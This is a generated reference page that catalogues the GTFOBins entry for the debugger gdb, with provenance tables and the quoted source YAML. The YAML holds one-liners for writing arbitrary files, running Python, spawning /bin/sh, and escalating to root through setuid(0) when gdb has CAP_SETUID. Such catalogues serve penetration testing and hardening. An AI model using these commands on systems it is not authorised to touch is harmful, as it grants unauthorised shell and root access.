---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# gdb

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `gdb` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gdb` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [gdb](../../tools/linux/gdb.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | gdb |
| name | gdb |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/gdb/ |

## Preserved Source Material

```yaml
_body: ''
_name: gdb
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/gdb
functions:
  file-write:
  - code: gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  inherit:
  - code: gdb -nx -ex 'python ...' -ex quit
    comment: This allows to run Python code (`...`).
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    from: python
  shell:
  - code: gdb -nx -ex '!/bin/sh' -ex quit
    contexts:
      capabilities:
        code: gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
        list:
        - CAP_SETUID
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
